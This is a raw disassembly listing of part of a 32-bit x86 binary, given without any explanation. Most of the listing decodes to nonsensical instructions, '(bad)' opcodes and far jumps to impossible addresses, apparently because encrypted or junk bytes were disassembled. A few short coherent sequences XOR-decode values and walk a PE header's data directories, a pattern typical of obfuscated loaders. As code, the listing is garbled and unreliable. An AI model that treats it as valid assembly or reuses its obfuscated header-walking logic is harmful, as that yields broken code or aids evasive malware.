  408d2d:	add    edx,ebx
  408d2f:	sub    bh,BYTE PTR [esp+ebx*2+0x75]
  408d33:	dec    edi
  408d34:	out    dx,eax
  408d35:	pop    ss
  408d36:	not    bh
  408d38:	adc    al,0xfb
  408d3a:	add    DWORD PTR [edx-0x2856e737],eax
  408d40:	fstp   QWORD PTR [edx]
  408d42:	retf   0x7b64
  408d45:	pop    esp
  408d46:	mov    bl,0xb6
  408d48:	aas    
  408d49:	add    eax,DWORD PTR [edi-0x6013fdd2]
  408d4f:	xor    eax,0x708baaf
  408d54:	xor    bh,BYTE PTR [esi-0xa]
  408d57:	shr    DWORD PTR [ecx+0x2750dd2d],1
  408d5d:	inc    esp
  408d5e:	in     eax,0x92
  408d60:	ds jno 0x408dc2
  408d63:	ins    BYTE PTR es:[edi],dx
  408d64:	sti    
  408d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d66:	add    ah,bl
  408d68:	mov    al,0x9a
  408d6a:	outs   dx,DWORD PTR ds:[esi]
  408d6b:	sub    BYTE PTR [eax],dh
  408d6d:	sbb    ah,BYTE PTR [ecx+0x46]
  408d70:	push   0x8c62a9f
  408d75:	inc    edx
  408d76:	xor    DWORD PTR [edx],0xf72e2370
  408d7c:	(bad)  
  408d7d:	push   esi
  408d7e:	jo     0x408d9c
  408d80:	stc    
  408d81:	shl    DWORD PTR [ecx-0x2fc78d88],1
  408d87:	push   edx
  408d88:	test   eax,0x4a2caa78
  408d8d:	mov    ds:0x91470ca1,eax
  408d92:	jb     0x408dcf
  408d94:	xchg   ebp,eax
  408d95:	(bad)  
  408d96:	(bad)  
  408d97:	out    dx,al
  408d98:	stos   BYTE PTR es:[edi],al
  408d99:	(bad)  
  408d9a:	mov    ebp,0xac3e139b
  408d9f:	js     0x408dac
  408da1:	int    0x8b
  408da3:	cmp    dh,bl
  408da5:	sbb    eax,ebx
  408da7:	push   0xffffffe0
  408da9:	fsub   QWORD PTR ds:0xbf118a22
  408daf:	ret    
  408db0:	popa   
  408db1:	int3   
  408db2:	in     al,0x5d
  408db4:	jecxz  0x408e10
  408db6:	mov    al,0x53
  408db8:	scas   eax,DWORD PTR es:[edi]
  408db9:	in     eax,0x2f
  408dbb:	(bad)  
  408dbc:	fs out dx,al
  408dbe:	call   0xf7db1a9a
  408dc3:	jg     0x408dab
  408dc5:	inc    ebp
  408dc6:	cmp    al,0xe9
  408dc8:	arpl   sp,sp
  408dca:	mov    bl,dh
  408dcc:	mov    ds:0x93dae353,eax
  408dd1:	cmp    BYTE PTR [edi+0x18],dh
  408dd4:	aad    0xa
  408dd6:	inc    eax
  408dd7:	stos   DWORD PTR es:[edi],eax
  408dd8:	enter  0xe267,0x48
  408ddc:	pop    eax
  408ddd:	lea    esi,[edi]
  408ddf:	mov    ds:0xb175ab34,eax
  408de4:	cdq    
  408de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de6:	mov    esi,0x95924bc
  408deb:	fnstcw WORD PTR [ebp-0x77]
  408dee:	test   eax,0x36923205
  408df3:	pushf  
  408df4:	sub    eax,0xd64d94f
  408df9:	(bad)  
  408dfa:	aaa    
  408dfb:	shr    DWORD PTR [edx-0x3be61458],cl
  408e01:	mov    eax,0x52b4b584
  408e06:	and    DWORD PTR [ecx+0x687fba02],esi
  408e0c:	pop    eax
  408e0d:	fiadd  DWORD PTR [eax-0x43]
  408e10:	js     0x408da8
  408e12:	mov    al,0xcc
  408e14:	jnp    0x408e73
  408e16:	mov    dl,0x47
  408e18:	xor    BYTE PTR [ebp-0x1d446468],0xab
  408e1f:	jo     0x408e20
  408e21:	test   BYTE PTR [ecx+0x6663fd96],cl
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x946b4299
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	fadd   QWORD PTR [eax+esi*8]
  408ec7:	leave  
  408ec8:	call   DWORD PTR [edi]
  408eca:	shl    DWORD PTR [ebp-0x110305f7],cl
  408ed0:	(bad)  
  408ed1:	sub    bl,bh
  408ed3:	xor    al,0xa3
  408ed5:	inc    esi
  408ed6:	sub    edx,esi
  408ed8:	push   es
  408ed9:	sahf   
  408eda:	hlt    
  408edb:	shr    DWORD PTR [esi-0x6a],1
  408ede:	adc    edi,DWORD PTR ds:[bp+di+0x4558]
  408ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee5:	mov    cl,0x3f
  408ee7:	jle    0x408e75
  408ee9:	mov    al,0x8c
  408eeb:	aad    0x23
  408eed:	jmp    0x93dc:0x9c5017ef
  408ef4:	push   ss
  408ef5:	popa   
  408ef6:	jne    0x408e78
  408ef8:	and    ebx,ebp
  408efa:	cwde   
  408efb:	sbb    al,BYTE PTR [eax+0xf]
  408efe:	int    0xcc
  408f00:	ins    BYTE PTR es:[edi],dx
  408f01:	jb     0x408f53
  408f03:	ficom  DWORD PTR [ecx-0x9]
  408f06:	daa    
  408f07:	inc    ebp
  408f08:	fldenv [edx]
  408f0a:	aad    0xfe
  408f0c:	in     eax,dx
  408f0d:	nop
  408f0e:	mov    dh,0x4b
  408f10:	pop    eax
  408f11:	fcmovnu st,st(6)
  408f13:	loope  0x408eba
  408f15:	shl    BYTE PTR [ebx-0x6afe2f63],0x38
  408f1c:	(bad)  
  408f1d:	add    al,0x4a
  408f1f:	lock dec ebp
  408f21:	pop    edx
  408f22:	(bad)  
  408f23:	pop    edx
  408f24:	outs   dx,DWORD PTR ds:[esi]
  408f25:	lds    ebx,FWORD PTR [edx-0x46f15ee9]
  408f2b:	dec    DWORD PTR [edi+0x46]
  408f2e:	addr16 mov eax,0x68076a95
  408f34:	and    eax,0xa7468b2e
  408f39:	mov    eax,esp
  408f3b:	sub    BYTE PTR [edx+0x4fa294fb],ah
  408f41:	push   cs
  408f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f43:	cwde   
  408f44:	je     0x408edc
  408f46:	pop    ebp
  408f47:	(bad)  
  408f48:	mov    ch,0xaa
  408f4a:	jp     0x408f68
  408f4c:	mov    BYTE PTR ds:0x9a4b7f1d,dl
  408f52:	sti    
  408f53:	push   esp
  408f54:	test   BYTE PTR [ecx-0x46e033f1],al
  408f5a:	inc    edx
  408f5b:	cmp    esi,DWORD PTR [edx]
  408f5d:	jmp    0xc187:0xf5fd5392
  408f64:	mov    ebp,0x78f8fad3
  408f69:	jnp    0x408fb7
  408f6b:	je     0x408f44
  408f6d:	and    eax,0x5dafa58d
  408f72:	pop    ecx
  408f73:	adc    al,0x10
  408f75:	scas   al,BYTE PTR es:[edi]
  408f76:	sbb    BYTE PTR [esi-0x4f8cc735],0xd7
  408f7d:	push   esp
  408f7e:	mov    WORD PTR ds:0x11dd74fd,es
  408f84:	xchg   ebp,eax
  408f85:	outs   dx,DWORD PTR ds:[esi]
  408f86:	and    bl,bl
  408f88:	ror    BYTE PTR [edi],1
  408f8a:	jp     0x409002
  408f8c:	int3   
  408f8d:	pusha  
  408f8e:	sbb    BYTE PTR [eax+0x5110965e],cl
  408f94:	out    0x7b,al
  408f96:	push   ss
  408f97:	imul   eax,DWORD PTR [esi],0xe17bc7f8
  408f9d:	pop    esp
  408f9e:	sbb    al,0x4b
  408fa0:	mov    ebx,0x86efa98c
  408fa5:	neg    DWORD PTR [eax+0x19]
  408fa8:	xchg   edx,eax
  408fa9:	or     ah,ch
  408fab:	pop    ebx
  408fac:	mov    ecx,0xc787037d
  408fb1:	ficom  DWORD PTR [esi]
  408fb3:	jo     0x409024
  408fb5:	jge    0x408fa1
  408fb7:	outs   dx,BYTE PTR ds:[esi]
  408fb8:	cmp    eax,0xa6a8b254
  408fbd:	push   0xffffffbe
  408fbf:	mov    ecx,0x842222df
  408fc4:	push   ebx
  408fc5:	test   eax,0x90ee1ec0
  408fca:	cwde   
  408fcb:	add    al,0x75
  408fcd:	mov    ah,0x54
  408fcf:	dec    edx
  408fd0:	lods   eax,DWORD PTR ds:[esi]
  408fd1:	push   cs
  408fd2:	adc    esp,esp
  408fd4:	mov    bl,cl
  408fd6:	lds    ebp,FWORD PTR [edi-0x15fcd532]
  408fdc:	in     eax,0x62
  408fde:	pop    edi
  408fdf:	and    al,0xf7
  408fe1:	adc    bh,0x1f
  408fe4:	outs   dx,DWORD PTR ds:[esi]
  408fe5:	pusha  
  408fe6:	fisubr DWORD PTR [ebx]
  408fe8:	icebp  
  408fe9:	sbb    edi,DWORD PTR [ebx-0x35fb0874]
  408fef:	pop    ecx
  408ff0:	push   es
  408ff1:	xchg   ecx,ebp
  408ff3:	inc    esi
  408ff4:	int3   
  408ff5:	push   eax
  408ff6:	sbb    al,0x49
  408ff8:	js     0x40906c
  408ffa:	je     0x40902b
  408ffc:	inc    ecx
  408ffd:	aas    
  408ffe:	xchg   ecx,eax
  408fff:	mov    ebx,0xbbbec3f
  409004:	and    al,ah
  409006:	push   cs
  409007:	inc    ebx
  409008:	xchg   ebx,eax
  409009:	mov    esp,0x7f757181
  40900e:	jne    0x409052
  409010:	lahf   
  409011:	jno    0x40901d
  409013:	cmp    bl,dl
  409015:	mov    dh,0xcf
  409017:	xchg   ebp,eax
  409018:	out    0xdf,eax
  40901a:	pop    ds
  40901b:	hlt    
  40901c:	jbe    0x408fb2
  40901e:	or     ecx,DWORD PTR [eax+0x61ec49d0]
  409024:	adc    eax,DWORD PTR [edi]
  409026:	adc    al,0x9a
  409028:	cld    
  409029:	sbb    eax,0x1325daf6
  40902e:	call   0xe93fec3c
  409033:	dec    ebp
  409034:	xor    al,0x7a
  409036:	fwait
  409037:	inc    esi
  409038:	faddp  st(5),st
  40903a:	fcom   st(7)
  40903c:	fisubr WORD PTR [ecx+0x49]
  40903f:	rcr    ebp,0x6c
  409042:	in     eax,dx
  409043:	fiadd  DWORD PTR [esi-0x7d]
  409046:	(bad)  
  409048:	push   cs
  409049:	das    
  40904a:	dec    esp
  40904b:	outs   dx,BYTE PTR ds:[esi]
  40904c:	into   
  40904d:	fnstsw WORD PTR [eax]
  40904f:	push   ss
  409050:	jecxz  0x409017
  409052:	jne    0x40904f
  409054:	scas   al,BYTE PTR es:[edi]
  409055:	inc    edx
  409056:	mov    esi,0xa4dfc70e
  40905b:	mov    esi,0xb20fe280
  409060:	jg     0x408ff8
  409062:	xchg   ebx,eax
  409063:	fninit 
  409065:	pop    edi
  409066:	dec    esi
  409067:	scas   eax,DWORD PTR es:[edi]
  409068:	cmp    eax,0xb4a30b38
  40906d:	imul   esp,esi,0x46
  409070:	shrd   DWORD PTR [edi],edx,0x91
  409074:	add    ch,cl
  409076:	sbb    BYTE PTR [ebx-0x218dd44e],dh
  40907c:	xchg   DWORD PTR [ebx-0x1e668691],eax
  409082:	add    esp,DWORD PTR [edi+0x7376a429]
  409088:	stos   DWORD PTR es:[edi],eax
  409089:	test   al,0x67
  40908b:	fstp   TBYTE PTR [ebx+0x1641f94d]
  409091:	mov    gs,WORD PTR [eax-0xd804fdb]
  409097:	out    0xb8,al
  409099:	sar    dl,1
  40909b:	add    eax,0xe79cf01c
  4090a0:	bnd jge 0x4090b6
  4090a3:	pop    esp
  4090a4:	sbb    esi,DWORD PTR [edx+0x75]
  4090a7:	call   0xbd4d:0xef7d8518
  4090ae:	imul   ecx,DWORD PTR [edx],0x1b
  4090b1:	xor    BYTE PTR [eax-0xd],dl
  4090b4:	ss pusha 
  4090b6:	ror    DWORD PTR [ebx],0xfa
  4090b9:	ins    BYTE PTR es:[edi],dx
  4090ba:	hlt    
  4090bb:	jp     0x4090ad
  4090bd:	call   0xdc379c08
  4090c2:	pusha  
  4090c3:	mov    al,0xb0
  4090c5:	jb     0x409132
  4090c7:	mov    cl,0x12
  4090c9:	sbb    esp,DWORD PTR [esp+edx*2-0x5c]
  4090cd:	mov    al,ds:0xcb522411
  4090d2:	(bad)  
  4090d3:	gs jae 0x409063
  4090d6:	in     al,dx
  4090d7:	(bad)  [ecx]
  4090d9:	lahf   
  4090da:	imul   ecx,DWORD PTR [eax+edx*1],0xc6f09a6f
  4090e1:	test   eax,eax
  4090e3:	sbb    dh,ah
  4090e5:	inc    edx
  4090e6:	rep outs dx,DWORD PTR ds:[esi]
  4090e8:	xchg   DWORD PTR [edi],ebp
  4090ea:	(bad)  
  4090eb:	xor    DWORD PTR [ecx+0x3c633ac],ecx
  4090f1:	(bad)  
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x14
  409163:	pop    edi
  409164:	add    BYTE PTR [edi],bl
  409166:	xor    bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	repnz adc esp,DWORD PTR [ecx+0x3f58b08c]
  409175:	sub    al,BYTE PTR [ebx+edx*4]
  409178:	xor    edx,DWORD PTR [edi+0x3f4f6aa8]
  40917e:	or     bl,ch
  409180:	imul   edi,DWORD PTR [eax],0x54f78055
  409186:	pop    esp
  409187:	iret   
  409188:	mov    al,ds:0xe81150da
  40918d:	(bad)  
  40918e:	mov    edi,0x8d4fabd
  409193:	out    dx,eax
  409194:	mov    bh,0xab
  409196:	dec    edx
  409197:	jl     0x409167
  409199:	lods   al,BYTE PTR ds:[esi]
  40919a:	fincstp 
  40919c:	and    al,0xfa
  40919e:	xchg   esi,eax
  40919f:	sub    eax,0x3aff8d78
  4091a4:	add    esp,ebp
  4091a6:	push   ecx
  4091a7:	xchg   esp,eax
  4091a8:	aad    0x8f
  4091aa:	into   
  4091ab:	pop    es
  4091ac:	call   0x560d:0xfc06c1ad
  4091b3:	and    BYTE PTR [ebx-0x620270d7],0x43
  4091ba:	loope  0x409204
  4091bc:	sbb    al,BYTE PTR [ebx-0x62]
  4091bf:	add    bh,bh
  4091c1:	jns    0x4091a1
  4091c3:	sbb    bl,BYTE PTR [edi-0x68]
  4091c6:	xchg   BYTE PTR [ebx],dh
  4091c8:	call   0x43c2d2d0
  4091cd:	ja     0x409162
  4091cf:	xor    eax,eax
  4091d1:	cmp    bh,BYTE PTR [esi+edx*2]
  4091d4:	sbb    BYTE PTR [edx],al
  4091d6:	stc    
  4091d7:	mov    esi,0x5a2473c8
  4091dc:	pop    ebp
  4091dd:	and    esi,DWORD PTR [eax-0x6a]
  4091e0:	fwait
  4091e1:	pop    edx
  4091e2:	in     eax,dx
  4091e3:	repnz dec ebx
  4091e5:	or     al,BYTE PTR [ecx-0x28]
  4091e8:	(bad)  
  4091e9:	out    0x6f,eax
  4091eb:	clc    
  4091ec:	leave  
  4091ed:	fsubr  QWORD PTR [edi]
  4091ef:	js     0x40919f
  4091f1:	dec    ebp
  4091f2:	adc    eax,0xc0eab18d
  4091f7:	lea    esi,ds:0x4817e9e8
  4091fd:	(bad)  
  4091fe:	in     al,dx
  4091ff:	in     eax,0x1d
  409201:	jl     0x409197
  409203:	jbe    0x409209
  409205:	repnz loopne 0x409240
  409208:	mov    BYTE PTR [ebx],al
  40920a:	sbb    eax,0x4dbf08e8
  40920f:	adc    DWORD PTR [ecx+0x4fe10cfb],0xc2e78f29
  409219:	(bad)  
  40921a:	ins    BYTE PTR es:[edi],dx
  40921b:	push   eax
  40921c:	sbb    BYTE PTR [edx+0x56],0x7e
  409220:	loopne 0x409248
  409222:	arpl   di,cx
  409224:	lods   eax,DWORD PTR ds:[esi]
  409225:	sub    ebx,ebx
  409227:	sbb    al,0xe5
  409229:	xor    DWORD PTR [edx],ebp
  40922b:	fcomp  st(4)
  40922d:	js     0x4091e6
  40922f:	or     eax,0xd48f25b
  409234:	scas   al,BYTE PTR es:[edi]
  409235:	call   0x827f1b77
  40923a:	aaa    
  40923b:	(bad)  
  40923c:	pushf  
  40923d:	xchg   esp,eax
  40923e:	or     al,0x8a
  409240:	loope  0x4091f9
  409242:	popf   
  409243:	(bad)  
  409245:	mov    ds:0xe974a4e0,al
  40924a:	push   ebp
  40924b:	jmp    0x80fd9d3a
  409250:	test   eax,0xbf613952
  409255:	dec    esi
  409256:	retf   
  409257:	jle    0x4091ec
  409259:	jmp    0x9c96:0x291edfa6
  409260:	jmp    0x7736:0x3ff44c43
  409267:	enter  0xcf74,0xc2
  40926b:	ret    
  40926c:	hlt    
  40926d:	push   0x5b
  40926f:	xor    ch,BYTE PTR [esi*1-0x5850658b]
  409276:	sahf   
  409277:	jno    0x409250
  409279:	pop    edx
  40927a:	iret   
  40927b:	call   0x4497394
  409280:	dec    esp
  409281:	dec    esp
  409282:	je     0x4092fd
  409284:	mov    dl,0xfd
  409286:	retf   
  409287:	inc    edi
  409288:	(bad)  
  409289:	pop    ecx
  40928a:	ins    DWORD PTR es:[edi],dx
  40928b:	mov    gs,WORD PTR [ecx]
  40928d:	test   BYTE PTR [eax*8+0x4907460],al
  409294:	add    DWORD PTR [esi],0xffffff83
  409297:	enter  0x3524,0xd1
  40929b:	mov    gs:0xc898ed3f,eax
  4092a1:	dec    esi
  4092a2:	inc    esp
  4092a3:	into   
  4092a4:	add    eax,0x227d5142
  4092a9:	add    DWORD PTR [edx],edi
  4092ab:	mov    eax,ds:0xa91eb880
  4092b0:	inc    edx
  4092b1:	xor    esi,DWORD PTR [esi*4-0x5f42816c]
  4092b8:	loop   0x4092b3
  4092ba:	sbb    DWORD PTR [ecx-0x2b4cc893],ebp
  4092c0:	call   0x5de4:0xb13e5a6f
  4092c7:	or     eax,DWORD PTR [eax]
  4092c9:	popa   
  4092ca:	pop    es
  4092cb:	fldenv [ebp+0x23b124d9]
  4092d1:	call   0x4f3d:0xae2b3485
  4092d8:	jl     0x4092fb
  4092da:	dec    ebx
  4092db:	xchg   DWORD PTR [eax+0x415f38c9],ebx
  4092e1:	fmul   DWORD PTR [edx]
  4092e3:	rcl    DWORD PTR [edx-0x3691c17b],cl
  4092e9:	ds daa 
  4092eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092ec:	push   cs
  4092ed:	jp     0x409320
  4092ef:	jo     0x409330
  4092f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f2:	shr    DWORD PTR [eax],cl
  4092f4:	dec    eax
  4092f5:	loop   0x40932d
  4092f7:	ja     0x40933e
  4092f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092fa:	sbb    DWORD PTR [edi-0x3be91131],edx
  409300:	stos   DWORD PTR es:[edi],eax
  409301:	xlat   BYTE PTR ds:[ebx]
  409302:	sub    DWORD PTR [esi],edi
  409304:	pushf  
  409305:	mov    eax,0x50c4e05b
  40930a:	cmp    esi,DWORD PTR es:[ecx+0x4b]
  40930e:	push   0xc9a3e5f4
  409313:	xor    eax,ebx
  409315:	(bad)  
  409316:	aad    0x49
  409318:	pshufw mm1,QWORD PTR [edx],0x6
  40931c:	mov    al,ds:0x26a23048
  409321:	or     al,0x37
  409323:	pop    ds
  409324:	and    al,0x70
  409326:	xor    esi,esp
  409328:	sahf   
  409329:	clc    
  40932a:	pop    edi
  40932b:	xchg   ebp,eax
  40932c:	sub    BYTE PTR [ecx+edi*4],cl
  40932f:	push   ecx
  409330:	inc    ebp
  409331:	xchg   esp,eax
  409332:	pop    eax
  409333:	fnstenv [edi]
  409335:	sar    DWORD PTR [eax-0x40],0x33
  409339:	and    BYTE PTR [esi],cl
  40933b:	sbb    BYTE PTR [ebp-0x3d65b45c],0x82
  409342:	add    edx,esi
  409344:	idiv   DWORD PTR [ebp+0x6529a4b9]
  40934a:	mov    ds:0x6c567e59,al
  40934f:	aad    0x8b
  409351:	ficomp DWORD PTR [edi+0x6c6eec67]
  409357:	scas   al,BYTE PTR es:[edi]
  409358:	aam    0x4d
  40935a:	addr16 sub al,0xae
  40935d:	std    
  40935e:	mov    edx,0x71841032
  409363:	(bad)  
  409364:	mov    al,0x99
  409366:	cs scas eax,DWORD PTR es:[edi]
  409368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409369:	mov    eax,0x46f1a14b
  40936e:	add    ah,BYTE PTR [eax]
  409370:	sbb    eax,0xac11b682
  409375:	in     eax,0x2c
  409377:	les    ebx,FWORD PTR [ecx+0x8c9b07f]
  40937d:	cmc    
  40937e:	cmp    al,BYTE PTR [edx+0x1b66ccb2]
  409384:	mov    ds,WORD PTR [ecx-0x11299ca1]
  40938a:	pop    esp
  40938b:	in     al,dx
  40938c:	mov    eax,0xfcaf9331
  409391:	(bad)  [esi+0x9]
  409394:	inc    edx
  409395:	sub    edi,DWORD PTR [edi+0x5c]
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	outs   dx,BYTE PTR ds:[esi]
  4093b5:	aam    0x36
  4093b7:	int3   
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	jmp    0x40939e
  4093c2:	xor    eax,0x1d6e83d0
  4093c7:	mov    al,0xd7
  4093c9:	adc    cl,BYTE PTR [edx]
  4093cb:	inc    eax
  4093cc:	jbe    0x409410
  4093ce:	xchg   edx,eax
  4093cf:	outs   dx,BYTE PTR ds:[esi]
  4093d0:	out    dx,al
  4093d1:	jb     0x409386
  4093d3:	push   ebp
  4093d4:	and    DWORD PTR [esi],0x4
  4093d7:	daa    
  4093d8:	mov    eax,ds:0x6ea6172c
  4093dd:	fiadd  WORD PTR [edi+0x76]
  4093e0:	hlt    
  4093e1:	inc    edi
  4093e2:	pop    esp
  4093e3:	cs enter 0x134f,0xdf
  4093e8:	cmc    
  4093e9:	and    bh,BYTE PTR [ecx+0x57]
  4093ec:	dec    eax
  4093ed:	rcr    bh,cl
  4093ef:	mov    edx,0x372c438
  4093f4:	adc    dh,BYTE PTR [ecx]
  4093f6:	xchg   ebp,eax
  4093f7:	in     al,dx
  4093f8:	cmp    al,0xa
  4093fa:	test   edx,edi
  4093fc:	jp     0x409450
  4093fe:	idiv   dl
  409400:	icebp  
  409401:	pop    ss
  409402:	fiadd  WORD PTR [edi+0x4c]
  409405:	pop    ebp
  409406:	test   edi,edi
  409408:	cmp    BYTE PTR [ebx],al
  40940a:	adc    al,0x1e
  40940c:	cmp    ebx,DWORD PTR [ecx+ecx*1+0x49a53ee8]
  409413:	add    al,0xe3
  409415:	jne    0x409485
  409417:	mov    ah,0x8c
  409419:	je     0x4093ec
  40941b:	dec    esi
  40941c:	ins    DWORD PTR es:[edi],dx
  40941d:	or     ebp,esp
  40941f:	push   eax
  409420:	in     eax,0xf3
  409422:	test   edi,0xcbe5db9f
  409428:	sub    BYTE PTR [ecx+0x24047001],dl
  40942e:	repnz pop ebx
  409430:	das    
  409431:	daa    
  409432:	push   edi
  409433:	mov    dl,0xe8
  409435:	sub    ah,BYTE PTR [ebp+0x770923b3]
  40943b:	inc    eax
  40943c:	(bad)  
  40943d:	loop   0x40943e
  40943f:	and    ecx,DWORD PTR [edx+ebp*2]
  409442:	imul   ecx,DWORD PTR [esp+eiz*8-0x6dbf9569],0xb83aebbb
  40944d:	call   0x1a0:0x693eab1e
  409454:	fstp   DWORD PTR [ecx]
  409456:	shl    DWORD PTR [edx+0xe741ce4],1
  40945c:	sbb    ebx,DWORD PTR [ebp-0xd]
  40945f:	xor    al,0x5f
  409461:	add    BYTE PTR [ebp-0x75],cl
  409464:	repnz sahf 
  409466:	xor    DWORD PTR [edi],edx
  409468:	sub    DWORD PTR [eax-0x2e7eda08],0xa6448207
  409472:	sbb    eax,0xcdd12027
  409477:	out    0x64,eax
  409479:	mov    bl,0xe6
  40947b:	jmp    0x409466
  40947d:	and    al,0x10
  40947f:	xchg   ecx,eax
  409480:	nop
  409481:	std    
  409482:	add    al,0xa2
  409484:	test   BYTE PTR [edx+0x6df46a3b],ah
  40948a:	jl     0x40949d
  40948c:	fsubr  QWORD PTR [esp+ebp*1-0x1a5cfa38]
  409493:	mov    BYTE PTR [edx-0x57],al
  409496:	loopne 0x4094a5
  409498:	call   0x57c6:0xc94b537
  40949f:	jno    0x4094f8
  4094a1:	sahf   
  4094a2:	clc    
  4094a3:	dec    edi
  4094a4:	stos   DWORD PTR es:[edi],eax
  4094a5:	enter  0x1ded,0x86
  4094a9:	xchg   DWORD PTR [ecx-0x44683b7d],esi
  4094af:	mov    eax,ds:0xf8915cf3
  4094b4:	or     al,0x8f
  4094b6:	(bad)  
  4094b7:	xchg   esi,eax
  4094b8:	adc    DWORD PTR [eax+edi*2-0x62],edi
  4094bc:	pop    eax
  4094bd:	push   cs
  4094be:	(bad)  
  4094bf:	(bad)  
  4094c0:	xchg   ecx,eax
  4094c1:	push   es
  4094c2:	mov    al,ds:0x7429173e
  4094c7:	jns    0x40944e
  4094c9:	sahf   
  4094ca:	pop    ss
  4094cb:	inc    edi
  4094cc:	xor    al,0xc6
  4094ce:	push   edi
  4094cf:	(bad)  
  4094d0:	lods   eax,DWORD PTR ds:[esi]
  4094d1:	pusha  
  4094d2:	push   esp
  4094d3:	pop    edx
  4094d4:	dec    eax
  4094d5:	inc    ecx
  4094d6:	push   esi
  4094d7:	jne    0x4094d8
  4094d9:	mov    ebx,0x5ce10061
  4094de:	xor    BYTE PTR ds:0xe4268080,bl
  4094e4:	imul   ecx,DWORD PTR [ebx+0x7e],0xffffff90
  4094e8:	mov    eax,fs:0x5fae8069
  4094ee:	cmp    esi,edi
  4094f0:	push   ebp
  4094f1:	push   eax
  4094f2:	arpl   WORD PTR [edi-0x80],bp
  4094f5:	cld    
  4094f6:	add    BYTE PTR [edi-0x2376be10],cl
  4094fc:	xchg   edi,eax
  4094fd:	ins    WORD PTR es:[edi],dx
  4094ff:	das    
  409500:	pop    esp
  409501:	jns    0x40954f
  409503:	mov    edx,0x18859735
  409508:	lock cmp eax,0x4364405b
  40950e:	es push es
  409510:	mov    cl,0x73
  409512:	aas    
  409513:	push   cs
  409514:	pop    edi
  409515:	push   ss
  409516:	add    eax,0xa94ceab6
